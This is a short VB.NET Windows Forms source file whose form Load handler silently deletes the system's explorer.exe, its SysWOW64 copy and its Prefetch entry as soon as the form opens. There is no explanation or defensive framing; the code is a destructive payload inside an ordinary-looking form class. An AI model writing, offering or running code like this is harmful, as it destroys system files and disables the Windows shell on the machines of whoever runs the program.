Public Class Form3

    Private Sub Form3_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        My.Computer.FileSystem.DeleteFile("C:/Windows/explorer.exe")
        My.Computer.FileSystem.DeleteFile("C:/Windows/SysWOW64/explorer.exe")
        My.Computer.FileSystem.DeleteFile("C:/Windows/Prefetch/EXPLORER.EXE-082F38A9.pf")
    End Sub
End Class